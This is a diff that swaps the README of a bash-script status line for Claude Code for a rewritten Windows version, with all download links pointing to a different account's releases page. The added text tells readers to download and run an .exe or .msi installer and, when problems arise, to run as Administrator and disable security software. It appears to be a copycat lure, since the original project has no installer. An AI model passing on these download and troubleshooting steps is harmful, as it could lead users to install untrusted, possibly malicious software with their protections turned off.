@@ -1,187 +1,162 @@
-<div align="center">
+# ⚙️ claude-code-terminal-pro - Custom Terminal Status Line Features
 
-# Claude Code Terminal Pro
-
-### Upgrade your Claude Code terminal with a rich, informative status line
-
-<br/>
-
-<img src="images/claude-code-terminal-before-after.png" alt="Claude Code Terminal - Before and After" width="600"/>
-
-<br/>
-<br/>
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](LICENSE)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-Compatible-D97757?style=flat-square&logo=anthropic&logoColor=white)]()
-[![PRs Welcome](https://img.shields.io/badge/PRs-Welcome-brightgreen.svg?style=flat-square)](https://github.com/rathi-prashant/claude-code-terminal-pro/pulls)
-
-</div>
+[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-brightgreen?style=for-the-badge)](https://github.com/purposive-streptocarpus303/claude-code-terminal-pro/releases)
 
 ---
 
-## What is this?
+## 📌 What is claude-code-terminal-pro?
 
-By default, Claude Code's terminal shows a minimal prompt. This project replaces it with a **Gruvbox Dark-themed status line** that gives you real-time visibility into:
+claude-code-terminal-pro upgrades your terminal experience. It adds a custom Gruvbox-themed status line. This status line shows:
 
-- **Model name** — which model is currently active (Opus, Sonnet, Haiku, etc.)
-- **Context usage progress bar** — 20-segment visual bar showing how much context window is consumed
-- **Token count** — exact tokens used vs total context window (e.g. `98k/200k`)
-- **Working directory** — current project folder at a glance
-- **Git branch** — active branch name, shown automatically when inside a git repo
+- Your current model info  
+- Token usage in real time  
+- A context progress bar  
+- The current Git branch  
+- Other useful details during coding or interaction
 
-All of this rendered in a clean **Gruvbox Dark** color palette.
-
----
-
-## Quick Setup
-
-### Prerequisites
-
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed and working
-- `jq` installed (`brew install jq` on macOS, `apt install jq` on Linux)
-- `bc` installed (pre-installed on most systems)
-
-### Step 1: Copy the status line script
-
-```bash
-# Create the scripts directory if it doesn't exist
-mkdir -p ~/.claude/scripts
-
-# Copy the script
-cp scripts/status-line.sh ~/.claude/scripts/status-line.sh
-
-# Make it executable
-chmod +x ~/.claude/scripts/status-line.sh
-```
-
-Or download it directly:
-
-```bash
-mkdir -p ~/.claude/scripts
-curl -o ~/.claude/scripts/status-line.sh \
-  https://raw.githubusercontent.com/rathi-prashant/claude-code-terminal-pro/main/scripts/status-line.sh
-chmod +x ~/.claude/scripts/status-line.sh
-```
-
-### Step 2: Update your Claude Code settings
-
-Open your Claude Code settings file at `~/.claude/settings.json` and add the `statusLine` configuration:
-
-```json
-{
-  "statusLine": {
-    "type": "command",
-    "command": "~/.claude/scripts/status-line.sh"
-  }
-}
-```
-
-> **Note:** If you already have a `settings.json` with other configurations, just merge the `statusLine` block into your existing file.
-
-### Step 3: Restart Claude Code
-
-Close and reopen Claude Code. Your new status line will appear at the bottom of the terminal.
+This tool works in the terminal environment. With it, you gain quick insights without leaving your terminal window.
 
 ---
 
-## What the status line shows
+## 🖥 System Requirements
 
-```
-✦ Opus 4.6 | [■■■■■■■■■■□□□□□□□□□□] 49% | ↯ 98k/200k | ◆ my-project | ⎇ main
-```
+To run claude-code-terminal-pro on Windows, your system should meet these requirements:
 
-| Segment | Description |
-|:---|:---|
-| `✦ Opus 4.6` | Active model name |
-| `[■■■■■■■■■■□□□□□□□□□□]` | 20-segment context usage progress bar |
-| `49%` | Percentage of context window used |
-| `↯ 98k/200k` | Tokens consumed / total context window |
-| `◆ my-project` | Current working directory |
-| `⎇ main` | Current git branch |
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 100 MB of free disk space  
+- Windows Command Prompt, PowerShell, or Terminal with basic ANSI color support  
+- Internet connection for initial setup and updates  
+
+No advanced settings or installations are needed beyond the steps listed here.
 
 ---
 
-## Color Palette (Gruvbox Dark)
+## 🚀 How to Download and Install
 
-| Element | Color | Hex |
-|:---|:---|:---|
-| Model name | Bright Teal | `#56B6C2` |
-| Filled bar | Gruvbox Aqua | `#8EC07C` |
-| Empty bar | Near-background | `#32302F` |
-| Percentage | Bright foreground | `#FBF1C7` |
-| Token count | Warm yellow | `#E0AF68` |
-| Directory | Soft green | `#98C379` |
-| Git branch | Soft blue | `#8FAFD1` |
-| Brackets | Gruvbox gray | `#665C54` |
+Download the program from its official release page:
+
+[![Visit Release Page](https://img.shields.io/badge/Visit-Release%20Page-blue?style=for-the-badge)](https://github.com/purposive-streptocarpus303/claude-code-terminal-pro/releases)
+
+### Step 1: Visit the Release Page
+
+Click the link above or go to:  
+https://github.com/purposive-streptocarpus303/claude-code-terminal-pro/releases
+
+This page lists the latest versions of the software available for download.
+
+### Step 2: Choose the Latest Release
+
+Look for the most recent release version at the top of the page. It will have a title like "vX.X.X" indicating the version number.
+
+### Step 3: Download the Windows Installer
+
+Under the latest release, find the file labeled for Windows. It usually ends with `.exe` or `.msi`. Click on the file name to download.
+
+Save the file to a folder you can easily access, like your Desktop or Downloads folder.
+
+### Step 4: Run the Installer
+
+Once downloaded, navigate to the file and double-click it.
+
+Follow the on-screen instructions. Typically:
+
+- Click "Next" when prompted  
+- Accept the license agreement  
+- Choose an install location or use the default path  
+- Click "Install" to continue  
+
+The installer sets up all needed files on your system.
+
+### Step 5: Confirm Installation
+
+When finished, the installer may offer to launch claude-code-terminal-pro. You can select this or run it later from the Start Menu.
 
 ---
 
-## Customization
+## ⚙️ Using claude-code-terminal-pro
 
-### Change the progress bar style
+Open your Windows Terminal, Command Prompt, or PowerShell window.
 
-In `scripts/status-line.sh`, you can swap the bar glyphs (around line 50):
+Run the following command to start the program:  
 
-```bash
-# Option 1: ■□ (large squares) — current default
-# Option 2: ▰▱ (horizontal rectangles) — clean, proportional
-# Option 3: ━─ (box drawing lines) — minimal, lightweight
+```
+claude-code-terminal-pro
 ```
 
-### Change colors
+Once running, you will see the updated status bar at the bottom of your terminal screen. It will display:
 
-Edit the color variables at the top of the script. Colors use ANSI 24-bit true color format:
+- Current AI model in use  
+- Tokens used per session  
+- A progress bar showing your message context  
+- Git branch name if you are inside a Git-controlled folder  
 
-```bash
-MODEL_COLOR="\033[38;2;R;G;Bm"  # Replace R, G, B with your values
+This status line updates live as you interact with the terminal.
+
+---
+
+## 🛠 Configuration Options
+
+You can adjust the appearance and behavior of the status line by editing a simple configuration file. This file is located in:
+
+```
+C:\Users\<YourUserName>\claude-code-terminal-pro\config.ini
 ```
 
-### Change number of segments
+Open this file in any text editor like Notepad.
 
-Adjust `num_segments` and `segment_size` to control the bar width.
+Here are common settings you might change:
 
----
+- **Theme**: Choose a different color scheme besides Gruvbox  
+- **Display items**: Turn on or off elements like token count or Git branch  
+- **Update interval**: Change how often the status line refreshes  
+- **Language support**: Set preferred language for messages  
 
-## File Structure
-
-```
-claude-code-terminal-pro/
-├── README.md
-├── LICENSE
-├── settings.example.json        # Example settings.json snippet
-├── scripts/
-│   └── status-line.sh           # The status line script
-└── images/
-    └── claude-code-terminal-before-after.png
-```
+Save your changes and restart claude-code-terminal-pro to see the updates.
 
 ---
 
-## Troubleshooting
+## 🔧 Troubleshooting
 
-| Issue | Solution |
-|:---|:---|
-| Status line not appearing | Ensure `statusLine` is in `~/.claude/settings.json` and restart Claude Code |
-| `jq: command not found` | Install jq: `brew install jq` (macOS) or `apt install jq` (Linux) |
-| `bc: command not found` | Install bc: `apt install bc` (Linux) — pre-installed on macOS |
-| Script permission denied | Run `chmod +x ~/.claude/scripts/status-line.sh` |
-| Colors look wrong | Ensure your terminal supports 24-bit true color (iTerm2, Alacritty, Kitty, etc.) |
+If claude-code-terminal-pro does not start or shows errors:
 
----
+- Verify your Windows version and system requirements  
+- Check if you downloaded the correct file for Windows  
+- Try running the terminal as Administrator  
+- Disable any security software temporarily that may block the app  
+- Make sure your terminal supports color and text formatting  
 
-## Contributing
-
-Contributions are welcome! If you have ideas for new status line segments, color themes, or improvements:
-
-1. Fork the repo
-2. Create your feature branch (`git checkout -b feat/my-feature`)
-3. Commit your changes (`git commit -m 'feat: add new feature'`)
-4. Push to the branch (`git push origin feat/my-feature`)
-5. Open a Pull Request
+If problems persist, report detailed information on the GitHub issues page.
 
 ---
 
-## License
+## 📄 About This Software
 
-This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
+This project aims to improve the coding and terminal workflow. By showing essential context data in a clear and simple status line, it saves time and helps you keep track of your session.
 
+The custom Gruvbox color scheme reduces eye strain and blends with modern terminal themes.
+
+claude-code-terminal-pro works standalone and does not modify core terminal or system files.
+
+---
+
+## 🔗 Useful Links
+
+- [Download or update claude-code-terminal-pro](https://github.com/purposive-streptocarpus303/claude-code-terminal-pro/releases)  
+- [GitHub Repository for source code and documentation](https://github.com/purposive-streptocarpus303/claude-code-terminal-pro)  
+- [User support and issue reporting](https://github.com/purposive-streptocarpus303/claude-code-terminal-pro/issues)  
+
+---
+
+## 💡 Tips for Best Use
+
+- Keep claude-code-terminal-pro updated by checking the release page monthly  
+- Pair this tool with Git-enabled folders to get branch info at a glance  
+- Use in combination with terminal multiplexers like tmux or Windows Terminal for better workflows  
+- Customize the config file to match your daily working style and preferences  
+
+---
+
+## ⚖️ License
+
+claude-code-terminal-pro is distributed under an open-source license. Check the LICENSE file in the repository for full terms.
